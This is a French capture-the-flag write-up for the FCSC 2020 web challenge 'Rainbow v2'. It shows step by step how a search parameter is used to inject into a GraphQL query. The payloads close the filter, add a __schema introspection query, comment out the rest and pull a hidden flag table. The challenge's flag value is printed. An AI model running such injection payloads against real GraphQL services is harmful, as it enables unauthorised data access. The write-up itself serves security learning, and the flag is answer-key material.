---
title: FR - FCSC 2020 - Write Up - Rainbow v2
date: 2020-05-18 10:20:00 +07:00
tags: [francais, FCSC, CTF, WU, Web, php, GraphQL]
description: Write Up du challenge Rainbow v2 du FCSC 2020.
---

## Rainbow v2
On découvre le même site que le précédent, à la différence près qu'il est sécurisé (o/).  
On remarque que la requête est différente, ici, on ne construis pas nous même la requete, on y donne simplement une valeur qui sera concaténé à la requête.

Testons quelques valeurs et analysons le résultat :

##### Quelques tests plus tard...
```js
search=%00
```
Result : `list all datas`

```js
search='
```
Result : `Nothing`

```js
search="
```
Result :
```js
{"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":1,"column":52}]}]}
```

#### Diagnostique
On peux facilement imaginer que la requete est la même que le challenge précédent, testons des injections :
```js
{ allCooks (filter: { firstname: {like: "%%"}}) { nodes { firstname, lastname, speciality, price }}}
```

Après diverses tentatives, j'ai remarqué que cette fois-ci, on peut chercher par firstname ET lastname...  
Modifions la requête en conséquence :
```js
{ allCooks (
filter: {
  or: [
    {lastname: {like: "%INJECT_HERE%"}},
    {firstname: {like: "%INJECT_HERE%"}}
  ],
 }) { nodes { firstname, lastname, speciality, price }}}
```

### Exploitation !
Après avoir fait proc diverses erreurs, j'ai pu construire mon payload :
```js
%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}allCooks(filter:{or:[{lastname:{like:"%
```
On remarque une erreur étrange :
```
[{"message":"Fields \"allCooks\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional."
```
La raison pour laquelle l'erreur est proc, c'est à cause de la redondance de allCooks, ajoutons un commentaire :
```js
%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#
```
Résultat :
```
{"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":2,"column":1}]}]}
```
Une syntax error... Voyons ce que donne cette requête au complet :

```js
{
  allCooks (filter: {
        or: [
            {lastname: {like:"%%"}}
            {firstname: {like:"%%"}}
        ]
      }
    )
    {nodes { firstname}}
    __schema{types{name,fields{name}}}#allCooks(filter:{or:[{lastname:{like:"%%"}}{firstname:{like:"%%"}}],}){nodes{firstname,lastname,speciality,price}}}
```

On remarque vite le problème, il manque la fermeture du premier bracket :
```js
%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}}#
```

Une fois éxecutée, la requête nous livre les informations sensibles du schema dont allFlagNotTheSameTableNames et flagNotTheSameFieldName.  
On adapte la requète pour lister les flags :
```js
%"}}{firstname:{like:"%%"}}]}){nodes{firstname}} allFlagNotTheSameTableNames (filter: { flagNotTheSameFieldName: {like: "%%"}}) { nodes { flagNotTheSameFieldName}}}#
```

#### Set as finished
Et hop :
```js
{"data":{"allCooks":{"nodes":[{"firstname":"Thibault"},{"firstname":"Antoinette"},{"firstname":"Bernard"},{"firstname":"Trycia"},{"firstname":"Jaleel"},{"firstname":"Isaac"},{"firstname":"Delbert"},{"firstname":"Paula"},{"firstname":"Teagan"},{"firstname":"Garfield"},{"firstname":"Elisabeth"},{"firstname":"Casey"},{"firstname":"Consuelo"},{"firstname":"Luciano"},{"firstname":"Piper"},{"firstname":"Jace"}]},"allFlagNotTheSameTableNames":{"nodes":[{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}]}}}
```
